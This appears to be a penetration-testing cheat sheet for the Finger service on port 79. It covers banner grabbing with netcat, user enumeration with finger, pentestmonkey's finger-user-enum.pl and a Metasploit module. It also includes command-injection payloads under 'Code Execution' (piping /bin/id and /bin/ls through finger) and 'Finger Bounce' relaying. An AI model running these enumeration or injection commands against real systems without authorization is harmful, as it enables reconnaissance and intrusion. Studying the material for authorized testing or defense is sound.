# What is Finger?

Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.

```bash
PORT     STATE SERVICE               VERSION
79/tcp   open  fing                  Debian fingerd 
```

## Banner Grabbing

```bash
nc -vn 10.10.x.x 79
echo "root" | nc -vn 10.10.x.x 79
```

## Finger Credentials

## User Enumeration

```bash
finger @10.10.x.x      #List users
finger admin@10.10.x.x #Get info of user
finger user@10.10.x.x  #Get info of user

#########
finger admin@192.186.x.x 
Login: admin                            Name: Jhon Doe 
Directory: /home/admin                  Shell: /bin/bash 
Never logged in. 
No mail. 
No Plan.
```

## Alternatively you can use finger-user-enum from pentestmonkey, some examples:

Download script and run it with a wordlist: [HERE](https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum-user-docs.pdf)

`finger-user-enum.pl` is a tool for enumerating OS-level user accounts via the finger service. As of release v1.0 it is known to work against the default Solaris daemon. It may not yet work against all daemons since there is no defined format for the data returned by the finger service.

```bash
finger-user-enum.pl -U users.txt -t 10.10.x.x
finger-user-enum.pl -u root -t 10.10.x.x
finger-user-enum.pl -U users.txt -T ips.txt
```

## Metasploit module for user enumeration

```bash
use auxiliary/scanner/finger/finger_users
```

## Code Execution

```bash
finger "|/bin/id@10.10.x.x"
finger "|/bin/ls -a /@10.10.x.x"
```

## Finger Bounce

```bash
finger user@host@victim
finger @internal@external
```
